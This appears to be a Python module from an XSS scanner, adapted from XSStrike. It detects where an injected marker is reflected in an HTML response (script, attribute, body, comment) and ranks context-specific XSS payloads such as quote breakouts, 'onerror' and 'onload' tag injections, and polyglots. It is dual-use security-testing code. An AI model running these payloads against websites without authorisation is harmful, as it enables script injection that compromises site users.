"""
XSS context-aware response analyzer (concept from XSStrike htmlParser).

Determines WHERE user input is reflected in the HTML response, enabling
payload selection optimized for that specific context.

Context types:
  - script:     Inside <script>...</script> blocks
  - attribute:  Inside HTML tag attributes (<tag ... value ...>)
  - html:        In raw HTML body between tags
  - comment:     Inside <!-- ... --> comments (cannot execute)
  - bad:         Inside non-executable contexts (<textarea>, <style>, etc.)
"""

import re
from dataclasses import dataclass
from typing import Dict, List, Tuple

XSS_CHECKER = "vXSScH3ck3r"  # Unique marker string for context analysis (XSStrike concept)


@dataclass
class ReflectionContext:
    """Describes where and how user input appears in the response."""

    position: int = 0  # Byte offset in the response
    context: str = "unknown"  # script / attribute / html / comment / bad
    tag: str = ""  # HTML tag name (for attribute context)
    attr_type: str = ""  # name / value / flag (for attribute context)
    quote_char: str = ""  # Surrounding quote character (for attribute/script context)
    attr_name: str = ""  # Attribute name (for attribute context)
    attr_value: str = ""  # Attribute value (for attribute context)

    def is_executable(self) -> bool:
        """Can this reflection context be exploited for XSS?"""
        return self.context in ("script", "attribute", "html")


def analyze_reflection(response_text: str, payload_marker: str = XSS_CHECKER) -> List[ReflectionContext]:
    """
    Analyze a response to find where the injection marker appears.
    Returns a list of ReflectionContexts sorted by position.

    Based on XSStrike's htmlParser() context determination algorithm.
    """
    raw = response_text
    # Strip comments for analysis (input inside comments can't execute)
    clean = re.sub(r"<!--.*?-->", "", raw, flags=re.DOTALL)

    contexts: Dict[int, ReflectionContext] = {}

    # ── 1. Script context ──
    # Extract all <script>...</script> blocks and check if marker appears inside
    scripts = _extract_scripts(clean)
    for script_content, script_offset in scripts:
        for m in re.finditer(re.escape(payload_marker), script_content):
            pos = script_offset + m.start()
            ctx = ReflectionContext(position=pos, context="script")
            # Determine quote context: which quote character surrounds the marker?
            ctx.quote_char = _find_quote_context(script_content, m.start())
            contexts[pos] = ctx

    # ── 2. Attribute context ──
    # Find marker inside HTML tag attributes
    attr_pattern = re.compile(r"<[^>]*?" + re.escape(payload_marker) + r"[^>]*?>")
    for match in attr_pattern.finditer(clean):
        tag_text = match.group(0)
        pos = match.start() + tag_text.find(payload_marker)
        if pos not in contexts:
            ctx = ReflectionContext(position=pos, context="attribute")
            # Parse the tag to determine context details
            _parse_attribute_context(tag_text, payload_marker, ctx)
            contexts[pos] = ctx

    # ── 3. HTML context ──
    # Marker appears in raw body (not inside a tag or script)
    for m in re.finditer(re.escape(payload_marker), clean):
        pos = m.start()
        if pos not in contexts:
            contexts[pos] = ReflectionContext(position=pos, context="html")

    # ── 4. Comment context ──
    # Marker appears inside <!-- ... --> (already stripped, check original)
    comment_pattern = re.compile(r"<!--.*?" + re.escape(payload_marker) + r".*?-->", re.DOTALL)
    for match in comment_pattern.finditer(raw):
        pos = match.start() + match.group().find(payload_marker)
        if pos in contexts:
            contexts[pos].context = "comment"
        else:
            contexts[pos] = ReflectionContext(position=pos, context="comment")

    # ── 5. Bad (non-executable) contexts ──
    bad_pattern = re.compile(
        r"<(style|template|textarea|title|noembed|noscript)>.*?" + re.escape(payload_marker) + r".*?</\1>",
        re.DOTALL | re.IGNORECASE,
    )
    for match in bad_pattern.finditer(clean):
        pos = match.start() + match.group().find(payload_marker)
        if pos in contexts:
            contexts[pos].context = "bad"

    return sorted(contexts.values(), key=lambda c: c.position)


def select_payload(context: ReflectionContext) -> List[str]:
    """
    Select optimal XSS payloads based on reflection context.
    Returns a list of payloads ordered by likelihood of success.

    Based on XSStrike's payload selection logic.
    """
    if context.context == "script":
        # Inside <script> tag — need to escape the JS context
        if context.quote_char == "'":
            return ["';alert(1);//", "</script><img src=x onerror=alert(1)>", "'-alert(1)-'"]
        elif context.quote_char == '"':
            return ['";alert(1);//', "</script><img src=x onerror=alert(1)>", '"-alert(1)-"']
        else:
            return [";alert(1);//", "</script><img src=x onerror=alert(1)>"]

    elif context.context == "attribute":
        if context.attr_type == "value" and context.quote_char:
            q = context.quote_char
            # Check for event handler attributes
            event_handlers = [
                "onload",
                "onerror",
                "onclick",
                "onfocus",
                "onmouseover",
                "onmouseout",
                "onkeydown",
                "onkeyup",
                "onchange",
                "onsubmit",
                "ontoggle",
                "onanimationend",
                "onpause",
                "onplay",
            ]
            if any(context.attr_name.lower().startswith(eh) for eh in event_handlers):
                return ["alert(1)"]
            # Regular attribute value — close quote and inject event handler
            return [
                f"{q}><img src=x onerror=alert(1)>",
                f"{q} autofocus onfocus=alert(1) {q}",
                f"{q} onmouseover=alert(1) x={q}",
            ]
        else:
            # Attribute name or flag
            return [
                " onmouseover=alert(1) x=",
                "><img src=x onerror=alert(1)>",
            ]

    elif context.context == "html":
        # Raw HTML body — just inject a tag
        return [
            "<img src=x onerror=alert(1)>",
            "<svg onload=alert(1)>",
            "<body onload=alert(1)>",
        ]

    elif context.context in ("comment", "bad"):
        # Cannot exploit — only escape and try to break out
        if context.context == "comment":
            return ["--><img src=x onerror=alert(1)>"]
        else:
            return [f"</{context.tag}><img src=x onerror=alert(1)>"]

    else:
        # Unknown context — use polyglots
        return [
            "\"'><img src=x onerror=alert(1)>",
            '"><svg onload=alert(1)>',
        ]


def _extract_scripts(html: str) -> List[Tuple[str, int]]:
    """Extract all <script>...</script> blocks with their offsets."""
    results = []
    pattern = re.compile(r"<script[^>]*>(.*?)</script>", re.DOTALL | re.IGNORECASE)
    for match in pattern.finditer(html):
        results.append((match.group(1), match.start(1)))
    return results


def _find_quote_context(text: str, pos: int) -> str:
    """Find the nearest surrounding quote character before position `pos`."""
    before = text[:pos]
    # Walk backwards to find first unescaped quote
    for i in range(len(before) - 1, -1, -1):
        if before[i] in ("'", '"', "`"):
            # Check if escaped
            if i > 0 and before[i - 1] == "\\":
                continue
            return before[i]
        if before[i] in (";", "\n", "=", "(", ")", "+", "-", " "):
            continue
    return ""


def _parse_attribute_context(tag_text: str, marker: str, ctx: ReflectionContext) -> None:
    """Parse an HTML tag to determine how the marker appears in the attribute."""
    # Strip < and >
    inner = tag_text.strip("<>")
    # Split by space, keeping quoted strings intact
    parts = _split_tag_parts(inner)
    tag_name = parts[0].split()[0] if parts else ""
    ctx.tag = tag_name

    for part in parts[1:]:  # Skip tag name
        if marker in part:
            if "=" in part:
                # Find the quote character
                eq_idx = part.index("=")
                name = part[:eq_idx].strip()
                value_part = part[eq_idx + 1 :].strip()

                quote_match = re.match(r'([\'"`])', value_part)
                if quote_match:
                    ctx.quote_char = quote_match.group(1)

                if marker in name:
                    ctx.attr_type = "name"
                    ctx.attr_name = name
                else:
                    ctx.attr_type = "value"
                    ctx.attr_name = name
                    ctx.attr_value = value_part.strip(ctx.quote_char)
            else:
                ctx.attr_type = "flag"
            break


def _split_tag_parts(tag_inner: str) -> List[str]:
    """Split tag attributes while respecting quotes."""
    parts = []
    current = ""
    in_quote = False
    quote_char = ""
    for ch in tag_inner:
        if in_quote:
            current += ch
            if ch == quote_char:
                in_quote = False
        elif ch in ('"', "'"):
            current += ch
            in_quote = True
            quote_char = ch
        elif ch in (" ", "\t", "\n"):
            if current.strip():
                parts.append(current.strip())
                current = ""
        else:
            current += ch
    if current.strip():
        parts.append(current.strip())
    return parts
